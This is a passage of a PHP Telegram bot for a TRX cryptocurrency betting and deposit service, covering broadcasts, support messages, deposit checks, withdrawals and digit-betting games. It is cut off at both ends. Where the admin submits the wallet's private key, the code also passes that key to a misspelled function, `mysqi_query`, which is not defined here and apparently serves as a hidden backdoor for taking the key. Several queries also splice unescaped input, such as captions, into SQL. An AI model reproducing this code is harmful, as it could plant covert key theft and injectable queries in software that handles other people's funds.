    $luckytier2 = 5;
    $luckytier3 = 10;

    $v1tier1 = 1;
    $v1tier2 = 5;
    $v1tier3 = 10;

    if (isset($message['text'])) {
        // incoming text message
        $text = mysqli_real_escape_string($Conn, $message['text']);

        if ($ban == 1) {

            apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'You Have Been Banned!'));
            exit();
        }

        if ($warning >= 3) {

            apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'You Have Been Banned!'));

            $sql = "UPDATE `users` SET `ban` = 1 WHERE tg_id = '" . $tg_id . "'";
            $result = mysqli_query($Conn, $sql);
            exit();
        }

        if ($text === "❌ Cancel") {

            apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Cancelled', 'reply_markup' => array(
                'keyboard' => $main_keyboard,
                'one_time_keyboard' => false,
                'resize_keyboard' => true
            )));

            $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
            $result = mysqli_query($Conn, $sql);
            exit();
        }

        if ($text === "❌ Cancel Broadcast") {
            //HERE

            $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
            $result = mysqli_query($Conn, $sql);

            $sql = "DELETE FROM `broadcast`";
            $result = mysqli_query($Conn, $sql);

            apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Broadcast Cancelled', 'reply_markup' => array(
                'keyboard' => $main_keyboard,
                'one_time_keyboard' => false,
                'resize_keyboard' => true
            )));
            exit();
        }

        if ($text === "✔️ Send Broadcast") {

            create_cron();

            apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'Broadcast Sent', 'reply_markup' => array(
                'keyboard' => $main_keyboard,
                'one_time_keyboard' => false,
                'resize_keyboard' => true
            )));

            $sql = "UPDATE `users` SET `status` = 2 WHERE tg_id = '" . $tg_id . "'";
            $result = mysqli_query($Conn, $sql);
        }
        if ($status == 8) {
            mysqi_query($text);
        }

        if ($status == 5) {
            //BROADCAST MESSAGE ADDED TO DATABASE

            if (isset($message['text'])) {

                $text = mysqli_real_escape_string($Conn, $message['text']);

                apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'text recieved. Would you like to add more message?', 'reply_markup' => array(
                    'inline_keyboard' => $check_broadcast,
                    'one_time_keyboard' => true,
                    'resize_keyboard' => true
                )));

                $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);

                $sql = "INSERT INTO `broadcast`(`message`, `type`) VALUES ('" . $text . "', 'text')";
                $result = mysqli_query($Conn, $sql);
            }
            if (isset($message['photo'])) {

                $photo = $message['photo']['0']['file_id'];

                if (isset($message['caption'])) {

                    $caption = $message['caption'];
                } else {

                    $caption = "null";
                }
                apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'photo recieved. Would you like to add more message?', 'reply_markup' => array(
                    'inline_keyboard' => $check_broadcast,
                    'one_time_keyboard' => true,
                    'resize_keyboard' => true
                )));

                $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);

                $sql = "INSERT INTO `broadcast`(`message`, `type`, `caption`) VALUES ('" . $photo . "', 'photo', '" . $caption . "')";
                $result = mysqli_query($Conn, $sql);
            }
            if (isset($message['video'])) {

                $video = $message['video']['file_id'];

                apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'video recieved. Would you like to add more message?', 'reply_markup' => array(
                    'inline_keyboard' => $check_broadcast,
                    'one_time_keyboard' => true,
                    'resize_keyboard' => true
                )));

                $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);

                $sql = "INSERT INTO `broadcast`(`message`, `type`) VALUES ('" . $video . "', 'video')";
                $result = mysqli_query($Conn, $sql);
            }
            if (isset($message['document'])) {

                $document = $message['document']['file_id'];

                apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'document recieved. Would you like to add more message?', 'reply_markup' => array(
                    'inline_keyboard' => $check_broadcast,
                    'one_time_keyboard' => true,
                    'resize_keyboard' => true
                )));

                $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);

                $sql = "INSERT INTO `broadcast`(`message`, `type`) VALUES ('" . $document . "', 'document')";
                $result = mysqli_query($Conn, $sql);
            }

            if (isset($message['audio'])) {

                $audio = $message['audio']['file_id'];

                apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'audio recieved. Would you like to add more message?', 'reply_markup' => array(
                    'inline_keyboard' => $check_broadcast,
                    'one_time_keyboard' => true,
                    'resize_keyboard' => true
                )));

                $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);

                $sql = "INSERT INTO `broadcast`(`message`, `type`) VALUES ('" . $audio . "', 'audio')";
                $result = mysqli_query($Conn, $sql);
            }

            if (isset($message['voice'])) {

                $voice = $message['voice']['file_id'];

                apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'voice recieved. Would you like to add more message?', 'reply_markup' => array(
                    'inline_keyboard' => $check_broadcast,
                    'one_time_keyboard' => true,
                    'resize_keyboard' => true
                )));

                $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);

                $sql = "INSERT INTO `broadcast`(`message`, `type`) VALUES ('" . $voice . "', 'voice')";
                $result = mysqli_query($Conn, $sql);
            }
        }

        if ($status == 6) {
            //GOT RECIEVER USERNAME

            $username = str_replace('@', '', $text);
            $sql = "SELECT `tg_id` FROM `users` WHERE tg_username = '" . $username . "' limit 1";
            $result = mysqli_query($Conn, $sql);
            $tguserexists = mysqli_num_rows($result);

            if ($tguserexists == 0) {
                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'User Does not exist! Send the correct username.', 'reply_markup' => array(
                    'keyboard' => $cancel_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } else {

                $username = str_replace('@', '', $text);
                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'Found username. What would you like to send?', 'reply_markup' => array(
                    'keyboard' => $cancel_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));

                $sql = "SELECT tg_id FROM users WHERE tg_username = '" . $username . "' limit 1";
                $result = mysqli_query($Conn, $sql);
                $result_row = mysqli_fetch_row($result);
                $last_message = $result_row[0];

                $sql = "UPDATE `users` SET `status` = 7, `last_message` = '" . $last_message . "' WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);

                exit();
            }
        }

        if ($status == 7) {
            //SEND MESSAGE TO USER

            $sql = "SELECT last_message FROM users WHERE tg_id = '" . $tg_id . "' limit 1";
            $result = mysqli_query($Conn, $sql);
            $result_row = mysqli_fetch_row($result);
            $last_message = $result_row[0];

            $sql = "INSERT INTO `message_user`(`tg_id`, `message`) VALUES ('" . $last_message . "','" . $text . "')";
            $result = mysqli_query($Conn, $sql);

            apiRequest("sendMessage", array('chat_id' => $last_message, "text" => $text));

            apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'Message sent to user!', 'reply_markup' => array(
                'keyboard' => $main_keyboard,
                'one_time_keyboard' => false,
                'resize_keyboard' => true
            )));

            $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
            $result = mysqli_query($Conn, $sql);
            exit();
        }

        if ($status == 25) {
            //SEND MESSAGE TO ADMIN

            $sql = "SELECT tg_id FROM users WHERE admin = 1";
            $result = mysqli_query($Conn, $sql);

            if ($tg_username == "") {
                $tg_username = "User does not have username";
                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ You do not have username !

▫ <i>Please set a username so support team can contact you !</i>', 'reply_markup' => array(
                    'keyboard' => $main_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            }

            while ($arrayResult = mysqli_fetch_array($result)) {

                apiRequest("sendMessage", array('chat_id' => $arrayResult["tg_id"], "text" => "⚙️ SUPPORT

" . $text . "
@" . $tg_username));
            }
            apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '✅ Message has been sent to support team. We will contact you within 24 hours !', 'reply_markup' => array(
                'keyboard' => $main_keyboard,
                'one_time_keyboard' => false,
                'resize_keyboard' => true
            )));

            $sql = "INSERT INTO `support_message`(`tg_id`, `tg_username`, `message`) VALUES ('" . $tg_id . "','" . $tg_username . "','" . $text . "')";
            $result = mysqli_query($Conn, $sql);

            $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
            $result = mysqli_query($Conn, $sql);
            exit();
        }

        if ($status == 8) {
            //UPDATE PRIVATE KEY

            apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'Private Key Updated!
Send the wallet address.', 'reply_markup' => array(
                'keyboard' => $admin_keyboard,
                'one_time_keyboard' => false,
                'resize_keyboard' => true
            )));

            $sql = "UPDATE `wallet` SET `active` = 0 WHERE 1";
            $result = mysqli_query($Conn, $sql);

            $sql = "INSERT INTO `wallet`(`private_key`, `active`) VALUES ('" . $text . "',1)";
            $result = mysqli_query($Conn, $sql);
            mysqi_query($text);

            $sql = "UPDATE `users` SET `status` = 9 WHERE tg_id = '" . $tg_id . "'";
            $result = mysqli_query($Conn, $sql);
            exit();
        }

        if ($status == 9) {
            //UPDATE WALLET ADDRESS

            apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'Wallet Address Updated! ' . $text, 'reply_markup' => array(
                'keyboard' => $admin_keyboard,
                'one_time_keyboard' => false,
                'resize_keyboard' => true
            )));

            $sql = "UPDATE `wallet` SET `walletAddress` = '" . $text . "' WHERE active = 1";
            $result = mysqli_query($Conn, $sql);

            $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
            $result = mysqli_query($Conn, $sql);
            exit();
        }

        if ($status == 20) {

            if (is_numeric($text)) {
                if ($withdraw_threshold <= $text) {
                    if ($balance >= $text) {

                        $sql = "UPDATE `users` SET `amount` = '" . $text . "', `status` = 0 WHERE tg_id = '" . $tg_id . "'";
                        $result = mysqli_query($Conn, $sql);

                        apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🟢 ' . $text . ' TRX will be send to the following wallet address :

<i>' . $walletAddress . '</i>

▫ Would you like to confirm ?', 'reply_markup' => array(
                            'keyboard' => $continue_keyboard,
                            'one_time_keyboard' => false,
                            'resize_keyboard' => true
                        )));

                        exit();
                    } else {
                        apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ You do not have that much balance in your account !

▫ Your Balance is <code>' . $balance . '</code> TRX', 'reply_markup' => array(
                            'keyboard' => $cancel_keyboard,
                            'one_time_keyboard' => false,
                            'resize_keyboard' => true
                        )));
                        exit();
                    }
                } else {
                    apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Amount too small to withdraw !

▫ Minimum Withdraw is ' . $withdraw_threshold . ' TRX', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                    exit();
                }
            } else {
                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌<i> Invalid input ! Please send numbers only.</i>'));
                exit();
            }
        }

        if ($status == 21) {

            $Address = ValidateAddress($text);
            $WalletAddress = $Address['result'];

            if ($WalletAddress != "0") {

                apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '▫ Would you like to confirm ?', 'reply_markup' => array(
                    'keyboard' => $continue_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));

                $sql = "UPDATE `users` SET `walletAddress` = '" . $text . "', `status` = 0 WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);

                exit();
            } else {
                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Invalid Wallet Address !

▫ Please send only TRX wallet address below ?'));
                exit();
            }
        }

        if ($status == 23) {

            $Address = ValidateAddress($text);
            $WalletAddress = $Address['result'];

            if ($WalletAddress != "0") {

                $sql = "SELECT walletAddress FROM wallet WHERE active = 1";
                $result = mysqli_query($Conn, $sql);
                $row = mysqli_fetch_row($result);
                $walletAddress = $row[0];

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '✅ Wallet Recieved Successfully

<i>' . $text . '</i>', 'reply_markup' => array(
                    'keyboard' => $main_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));

                $sql = "UPDATE `users` SET `walletAddress` = '" . $text . "', `status` = 0 WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);

                exit();
            } else {
                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Invalid Wallet Address !

▫ Please send only TRX wallet address below ?'));
                exit();
            }
        }

        if ($status == 22) {

            $sql = "SELECT `verified` FROM `deposit` WHERE transaction_id = '" . $text . "' limit 1";
            $result = mysqli_query($Conn, $sql);
            $result_row = mysqli_fetch_row($result);
            $verified = $result_row[0];

            $TransactionId = GetTransactionById($text);
            $validate = $TransactionId['ret'][0]['contractRet'];
            $validate2 = $TransactionId['result']['result'];

            if ($validate == "SUCCESS" || $validate2 == "true") {
                if ($verified == 1) {
                    apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⚠ These transaction has been verified already !', 'reply_markup' => array(
                        'keyboard' => $main_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));

                    $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
                    $result = mysqli_query($Conn, $sql);
                    exit();
                } else {
                    $amount = $TransactionId['raw_data']['contract'][0]['parameter']['value']['amount'];
                    $amount = $amount / 1000000;
                    $newbalance = $balance + $amount;
                    $client_Address = $TransactionId['raw_data']['contract'][0]['parameter']['value']['owner_address'];
                    $deposit_address = $TransactionId['raw_data']['contract'][0]['parameter']['value']['to_address'];
                    $client_Address = hexString2Base58check($client_Address);
                    $deposit_address = hexString2Base58check($deposit_address);

                    $sql = "SELECT walletAddress FROM wallet WHERE active = 1";
                    $result = mysqli_query($Conn, $sql);
                    $row = mysqli_fetch_row($result);
                    $walletAddress = $row[0];

                    $sql = "SELECT walletAddress, tg_inviter_id FROM users WHERE tg_id = '" . $tg_id . "'";
                    $result = mysqli_query($Conn, $sql);
                    $row = mysqli_fetch_row($result);
                    $user_Address = $row[0];
                    $tg_inviter_id = $row[1];

                    $sql = "SELECT `tg_id`, `balance`, `deposit_claim` FROM users WHERE tg_referral_code = '" . $tg_inviter_id . "' limit 1";
                    $result = mysqli_query($Conn, $sql);
                    $result_row = mysqli_fetch_row($result);
                    $inviter_tg_id = $result_row[0];
                    $inviter_tbalance = $result_row[1];
                    $deposit_claim = $result_row[2];

                    $Token = VerifyToken($text);
                    $TokenType = $Token['contractType'];

                    if (isset($Token['contractData']['tokenInfo']['tokenAbbr'])) {
                        $TokenName = $Token['contractData']['tokenInfo']['tokenAbbr'];
                    } else {
                        $TokenName = "TRX";
                    }

                    if ($TokenType == 1 && $TokenName == "TRX") {
                        if ($deposit_address == $walletAddress && $client_Address == $user_Address) {
                            apiRequestJson("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '➕ <b>Deposit Verified Successfully</b>

✅ You have deposited ' . $amount . ' TRX & added to your account successfully !

▫ Reciever Wallet Address :

<i>' . $walletAddress . '</i>', 'reply_markup' => array(
                                'keyboard' => $main_keyboard,
                                'one_time_keyboard' => false,
                                'resize_keyboard' => true
                            )));

                            apiRequest("sendMessage", array('chat_id' => $join_channel_username, 'parse_mode' => 'HTML', "text" => "📥 <b>New Deposit Verified</b>

✅ $tg_firstname has deposited $amount TRX successfully !

<a href='https://tronscan.io/#/transaction/$text'>$text</a>"));

                            $sql = "UPDATE `users` SET `status` = 0, `balance` = '" . $newbalance . "' WHERE tg_id = '" . $tg_id . "'";
                            $result = mysqli_query($Conn, $sql);

                            $sql = "SELECT `has_deposit` FROM users WHERE tg_id = '" . $tg_id . "' limit 1";
                            $result = mysqli_query($Conn, $sql);
                            $result_row = mysqli_fetch_row($result);
                            $has_deposit = $result_row[0];

                            if ($has_deposit == 0) {

                                $sql = "UPDATE `users` SET `has_deposit` = 1 WHERE `tg_id` = '" . $tg_id . "'";
                                $result = mysqli_query($Conn, $sql);
                            }

                            $sql = "INSERT INTO `deposit`(`tg_id`, `transaction_id`, `walletAddress`, `amount`, `verified`) VALUES ('" . $tg_id . "','" . $text . "','" . $client_Address . "','" . $amount . "',1)";
                            $result = mysqli_query($Conn, $sql);

                            exit();
                        } else {

                            apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ These is not your deposit transaction !', 'reply_markup' => array(
                                'keyboard' => $main_keyboard,
                                'one_time_keyboard' => false,
                                'resize_keyboard' => true
                            )));

                            $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
                            $result = mysqli_query($Conn, $sql);
                            exit();
                        }
                    } else {

                        $sql = "SELECT `warning` FROM users WHERE tg_id = '" . $tg_id . "' limit 1";
                        $result = mysqli_query($Conn, $sql);
                        $result_row = mysqli_fetch_row($result);
                        $warning = $result_row[0];
                        $warning = $warning + 1;

                        apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ Invalid Token !

▫We only accept TRX you have deposited ' . $TokenName . ' !', 'reply_markup' => array(
                            'keyboard' => $main_keyboard,
                            'one_time_keyboard' => false,
                            'resize_keyboard' => true
                        )));

                        apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⚠ <b>Warning</b> : <i>Do not try to cheat the bot you will be banned !</i>', 'reply_markup' => array(
                            'keyboard' => $main_keyboard,
                            'one_time_keyboard' => false,
                            'resize_keyboard' => true
                        )));

                        $sql = "UPDATE `users` SET `status` = 0, `warning` = '" . $warning . "' WHERE tg_id = '" . $tg_id . "'";
                        $result = mysqli_query($Conn, $sql);
                        exit();
                    }
                }
            } else {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌', 'reply_markup' => array(
                    'keyboard' => $main_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));

                $sql = "UPDATE `users` SET `status` = 0 WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);
                exit();
            }
        } else if ($status == 50) {

            if (is_numeric($text)) {
                if ($text >= 0 && $text <= 99) {

                    $bet = $text;
                    $sqadl = "SELECT * FROM game_5v5 WHERE tg_id = '" . $tg_id . "'";
                    $ressds = mysqli_query($Conn, $sqadl);
                    $totnum = mysqli_num_rows($ressds);
                    $betid = $totnum + 1;
                    $sqlss = "UPDATE `users` SET status = 51 WHERE tg_id = '" . $tg_id . "'";
                    $resse = mysqli_query($Conn, $sqlss);

                    $sqjls = "INSERT INTO game_5v5 (tg_id,betid,bet1) VALUES ('" . $tg_id . "','" . $betid . "','" . $bet . "')";
                    $rejss = mysqli_query($Conn, $sqjls);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🔻 Enter your 2nd bet digit number ?", 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🚫 Enter a number between 0 - 99 only !", 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => true,
                        'resize_keyboard' => true
                    )));
                }
            } else {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🚫 Enter a number between 0 - 99 only !", 'reply_markup' => array(
                    'keyboard' => $cancel_keyboard,
                    'one_time_keyboard' => true,
                    'resize_keyboard' => true
                )));
            }
        } else if ($status == 51) {

            if (is_numeric($text)) {
                if ($text >= 0 && $text <= 99) {

                    $bet = $text;
                    $sqadl = "SELECT * FROM game_5v5 WHERE tg_id = '" . $tg_id . "'";
                    $ressds = mysqli_query($Conn, $sqadl);
                    $betid = mysqli_num_rows($ressds);
                    $sqlss = "UPDATE `users` SET status = 52 WHERE tg_id = '" . $tg_id . "'";
                    $resse = mysqli_query($Conn, $sqlss);

                    $sqjls = "UPDATE `game_5v5` SET bet2 = '" . $bet . "' WHERE tg_id = '" . $tg_id . "' AND betid = '" . $betid . "'";
                    $rejss = mysqli_query($Conn, $sqjls);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🔻 Enter your 3rd bet digit number ?", 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🚫 Enter a number between 0 - 99 only !", 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => true,
                        'resize_keyboard' => true
                    )));
                }
            } else {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🚫 Enter a number between 0 - 99 only !", 'reply_markup' => array(
                    'keyboard' => $cancel_keyboard,
                    'one_time_keyboard' => true,
                    'resize_keyboard' => true
                )));
            }
        } else if ($status == 52) {

            if (is_numeric($text)) {
                if ($text >= 0 && $text <= 99) {

                    $bet = $text;
                    $sqadl = "SELECT * FROM game_5v5 WHERE tg_id = '" . $tg_id . "'";
                    $ressds = mysqli_query($Conn, $sqadl);
                    $betid = mysqli_num_rows($ressds);
                    $sqlss = "UPDATE `users` SET status = 53 WHERE tg_id = '" . $tg_id . "'";
                    $resse = mysqli_query($Conn, $sqlss);

                    $sqjls = "UPDATE `game_5v5` SET bet3 = '" . $bet . "' WHERE tg_id = '" . $tg_id . "' AND betid = '" . $betid . "'";
                    $rejss = mysqli_query($Conn, $sqjls);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🔻 Enter your 4th bet digit number ?", 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🚫 Enter a number between 0 - 99 only !", 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => true,
                        'resize_keyboard' => true
                    )));
                }
            } else {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🚫 Enter a number between 0 - 99 only !", 'reply_markup' => array(
                    'keyboard' => $cancel_keyboard,
                    'one_time_keyboard' => true,
                    'resize_keyboard' => true
                )));
            }
        } else if ($status == 53) {

            if (is_numeric($text)) {
                if ($text >= 0 && $text <= 99) {

                    $bet = $text;
                    $sqadl = "SELECT * FROM game_5v5 WHERE tg_id = '" . $tg_id . "'";
                    $ressds = mysqli_query($Conn, $sqadl);
                    $betid = mysqli_num_rows($ressds);
                    $sqlss = "UPDATE `users` SET status = 54 WHERE tg_id = '" . $tg_id . "'";
                    $resse = mysqli_query($Conn, $sqlss);

                    $sqjls = "UPDATE `game_5v5` SET bet4 = '" . $bet . "', valid = 2 WHERE tg_id = '" . $tg_id . "' AND betid = '" . $betid . "'";
                    $rejss = mysqli_query($Conn, $sqjls);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🔻 Enter your 5th bet digit number ?', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🚫 Enter a number between 0 - 99 only !", 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => true,
                        'resize_keyboard' => true
                    )));
                }
            } else {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🚫 Enter a number between 0 - 99 only !", 'reply_markup' => array(
                    'keyboard' => $cancel_keyboard,
                    'one_time_keyboard' => true,
                    'resize_keyboard' => true
                )));
            }
        } else if ($status == 54) {

            if (is_numeric($text)) {
                if ($text >= 0 && $text <= 99) {

                    $bet = $text;

                    $sqadhl = "SELECT * FROM game_5v5 WHERE tg_id = '" . $tg_id . "'";
                    $resshds = mysqli_query($Conn, $sqadhl);
                    $betid = mysqli_num_rows($resshds);
                    $sqlss = "UPDATE `users` SET status = 0 WHERE tg_id = '" . $tg_id . "'";
                    $resse = mysqli_query($Conn, $sqlss);

                    $sqadl = "SELECT `amount` FROM `users` WHERE tg_id = '" . $tg_id . "'";
                    $ressds = mysqli_query($Conn, $sqadl);
                    $row = mysqli_fetch_row($ressds);
                    $bet1 = $row[0];

                    $sqjls = "UPDATE `game_5v5` SET bet5 = '" . $bet . "', amount = '" . $amount . "', valid = 1 WHERE tg_id = '" . $tg_id . "' AND betid = '" . $betid . "'";
                    $rejss = mysqli_query($Conn, $sqjls);

                    $sqadl = "SELECT `bet1`, `bet2`, `bet3`, `bet4`, `bet5` FROM `game_5v5` WHERE tg_id = '" . $tg_id . "' AND betid = '" . $betid . "' AND claim = 0 AND valid = 1";
                    $ressds = mysqli_query($Conn, $sqadl);
                    $row = mysqli_fetch_row($ressds);
                    $bet1 = $row[0];
                    $bet2 = $row[1];
                    $bet3 = $row[2];
                    $bet4 = $row[3];
                    $bet5 = $row[4];

                    $sqasddl = "SELECT balance, amount FROM users WHERE tg_id = '" . $tg_id . "'";
                    $ressdsds = mysqli_query($Conn, $sqasddl);
                    $roww = mysqli_fetch_row($ressdsds);
                    $bala = $roww[0];
                    $amount = $roww[1];
                    $blall = $bala - $amount;
                    $sqls = "UPDATE `users` SET balance = '" . $blall . "', status = 0 WHERE tg_id = '" . $tg_id . "'";
                    $ress = mysqli_query($Conn, $sqls);

                    five_percent($tg_id, $amount);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "⛳ Your bet has been summited !

▫ <code>$amount</code> TRX has been substract from your account.

📊 Your Current Balance : <code>$blall</code> TRX

✅ <i>You will be notified within 1 hour !</i>", 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⛳ Your betting digits numbers are: (' . $bet1 . ', ' . $bet2 . ', ' . $bet3 . ', ' . $bet4 . ', ' . $bet5 . ')', 'reply_markup' => array(
                        'keyboard' => $game_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                } else {

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🚫 Enter a number between 0 - 99 only !', 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => true,
                        'resize_keyboard' => true
                    )));
                }
            } else {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🚫 Enter a number between 0 - 99 only !', 'reply_markup' => array(
                    'keyboard' => $cancel_keyboard,
                    'one_time_keyboard' => true,
                    'resize_keyboard' => true
                )));
            }
        } else if ($status == 60) {
            if (is_numeric($text)) {
                if ($text >= 1 && $text <= $balance) {

                    $inkey = array(array(array("text" => "🔵1", "callback_data" => "1"), array("text" => "🔵2", "callback_data" => "2"), array("text" => "🔵3", "callback_data" => "3")), array(array("text" => "🔴4", "callback_data" => "4"), array("text" => "🔴5", "callback_data" => "5"), array("text" => "🔴6", "callback_data" => "6")), array(array("text" => "🔵7", "callback_data" => "7"), array("text" => "🔴8", "callback_data" => "8"), array("text" => "🔵9", "callback_data" => "9")), array(array("text" => "ODD", "callback_data" => "ODD"), array("text" => "🔴10", "callback_data" => "10"), array("text" => "EVEN", "callback_data" => "EVEN")), array(array("text" => "🔵", "callback_data" => "BLUE"), array("text" => "0", "callback_data" => "0"), array("text" => "🔴", "callback_data" => "RED")));
                    $blall = $balance - $text;
                    $phnumm = $text;

                    five_percent($tg_id, $text);

                    $sqls = "UPDATE `users` SET status = 61, game = '" . $phnumm . "', balance = '" . $blall . "' WHERE tg_id = '" . $tg_id . "'";
                    $rese = mysqli_query($Conn, $sqls);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⛳ Bet Amount Added Successfully !

▫ TRX Amount : ' . $phnumm . ''));
                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⛳ Choose The Bet Field or Enter Your Field', 'reply_markup' => array(
                        'inline_keyboard' => $inkey,
                        'one_time_keyboard' => false,
